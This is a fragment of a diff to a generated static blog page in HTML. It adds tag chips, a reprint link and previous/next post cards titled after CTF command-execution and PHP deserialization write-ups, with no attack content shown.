+                    <a href="https://h3h3qaq.github.io/posts/62244cdb.html">https://h3h3qaq.github.io/posts/62244cdb.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -687,7 +980,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                                    <span class="chip bg-color">做题记录</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -1162,13 +1459,13 @@ new Valine({
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/baidu_verify_xxxxxxx.html">
+                <a href="/posts/62244cdb.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg" class="responsive-img" alt="">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020616.jpg" class="responsive-img" alt="CTFSHOW命令执行">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">CTFSHOW命令执行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1179,7 +1476,7 @@ new Valine({
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-11
                             </span>
                         <span class="publish-author">
                             
@@ -1191,22 +1488,30 @@ new Valine({
                 </div>
 
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">做题记录</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/baidu_verify_xxxxxxx.html">
+                <a href="/posts/ae3250a1.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021815.jpg" class="responsive-img" alt="">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928020502.jpg" class="responsive-img" alt="PHP反序列化漏洞基础">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">PHP反序列化漏洞基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1227,7 +1532,14 @@ new Valine({
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
